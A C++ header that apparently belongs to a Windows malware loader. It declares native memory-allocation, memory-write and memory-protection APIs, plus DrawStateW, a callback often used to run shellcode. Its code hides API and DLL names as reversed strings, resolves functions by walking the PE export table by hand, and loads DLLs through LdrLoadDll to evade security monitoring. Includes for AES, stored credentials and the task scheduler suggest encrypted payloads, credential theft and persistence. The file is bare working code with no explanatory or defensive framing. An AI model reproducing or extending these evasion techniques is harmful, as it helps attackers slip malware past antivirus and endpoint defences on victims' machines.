#pragma once
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <comdef.h>
#include <wincred.h>
#include <taskschd.h>
#include "aes.hpp"
#include "CustomWinApi.h"
#include <winternl.h>

typedef BOOL(WINAPI* pDrawStateW)(
    HDC hdc,
    HBRUSH hbrFore,
    DRAWSTATEPROC qfnCallBack,
    LPARAM lData,
    WPARAM wData,
    int x,
    int y,
    int cx,
    int cy,
    UINT uFlags
    );

typedef NTSTATUS (WINAPI* pNtProtectVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect
);

typedef NTSTATUS(WINAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

typedef NTSTATUS(WINAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten OPTIONAL
    );

typedef NTSTATUS(NTAPI* pLdrLoadDll)(
    PWCHAR PathToFile, 
    ULONG Flags, 
    PUNICODE_STRING ModuleFileName, 
    PHANDLE ModuleHandle);

typedef VOID(NTAPI* pRtlInitUnicodeString)(
    PUNICODE_STRING DestinationString, 
    PCWSTR SourceString);

typedef BOOL(WINAPI* pShellExecuteExW)(
    SHELLEXECUTEINFOW* pExecInfo);

typedef BOOL(WINAPI* pCloseHandle)(HANDLE hObject);

typedef DWORD(WINAPI* pWaitForSingleObject)(
    HANDLE hHandle, 
    DWORD dwMilliseconds);

typedef LONG(WINAPI* RegO)(HKEY hKey,
    LPCTSTR lpSubKey,
    DWORD ulOptions,
    REGSAM samDesired,
    PHKEY phkResult);

void invertwString(std::wstring& str) {
    std::reverse(str.begin(), str.end());
}

void invertString(std::string& str) {
    std::reverse(str.begin(), str.end());
}

int custom_strcmp(const char* str1, const char* str2) {
    while (*str1 || *str2) {
        if (*str1 < *str2) {
            return -1;
        }
        else if (*str1 > *str2) {
            return 1;
        }
        str1++;
        str2++;
    }
    return 0;
}

FARPROC myGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);
    DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);
    for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
        if (custom_strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
            return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
        }
    }
    return NULL;
}

HMODULE My0LoadLibrary(LPCWSTR lpFileName) {

    UNICODE_STRING ustrModule;
    HANDLE hModule = NULL;
    std::wstring dll_nt = L"lld.lldtn";
    invertwString(dll_nt);
    LPCWSTR dll_nt_wide = dll_nt.c_str();

    std::string RtUnicode = "gnirtSedocinUtinIltR";
    std::string LdrLDLL = "llDdaoLrdL";
    LPCSTR LLdrLDLL = LdrLDLL.c_str();

    HMODULE hNtdll = GetModuleW(dll_nt_wide);
    invertString(RtUnicode);
    LPCSTR RtlInitUnicodeStrinng = RtUnicode.c_str();
    pRtlInitUnicodeString RtlInitUnicodeString = (pRtlInitUnicodeString)myGetProcAddress(hNtdll, RtlInitUnicodeStrinng);
    invertString(RtUnicode);
    RtlInitUnicodeString(&ustrModule, lpFileName);
    invertString(LdrLDLL);
    pLdrLoadDll myLdrLoadDll = (pLdrLoadDll)myGetProcAddress(hNtdll, LLdrLDLL);
    if (!myLdrLoadDll) {
        return NULL;}
    NTSTATUS status = myLdrLoadDll(NULL, 0, &ustrModule, &hModule);
    invertString(LdrLDLL);
    return (HMODULE)hModule;
}
